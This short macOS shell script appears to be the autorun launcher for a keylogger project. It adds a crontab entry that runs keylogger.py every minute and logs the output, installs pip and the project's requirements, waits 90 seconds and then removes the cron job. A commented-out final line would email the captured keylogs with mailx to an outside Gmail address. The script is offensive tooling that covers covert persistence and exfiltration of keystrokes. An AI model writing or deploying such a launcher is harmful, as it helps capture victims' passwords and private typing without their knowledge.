#!/bin/sh

cd

filepath="$(find -iname autorun_mac.command)"
path="${filepath/autorun_mac.command}"
path="${path/./$(pwd)}"

# add crontab to run the keylogger every minute
crontab_command="* * * * * cd ${path} && python3 keylogger.py > ../logs/keylogs/keylog_cront_outputs/keylog_outputs.txt 2> ../logs/keylogs/keylog_cron_errors/keylog_errors.txt"

crontab -l 2>/dev/null| cat - <(echo "$crontab_command") | crontab -


### install pip ###

curl -O https://bootstrap.pypa.io/get-pip.py
python3 get-pip.py

rm get-pip.py
python3 -m pip install -r "$path"../requirements.txt


# sleep for 90 seconds, 30 seconds before the second call of the keylogger file
sleep 90

# rm cronjob
crontab -u $USER -l | grep -v "$crontab_command" | crontab -u $USER -

# echo hi.tmp | mailx -s "keylogs $(date)" -r sender_email@gmail.com receiver_email@gmail.com
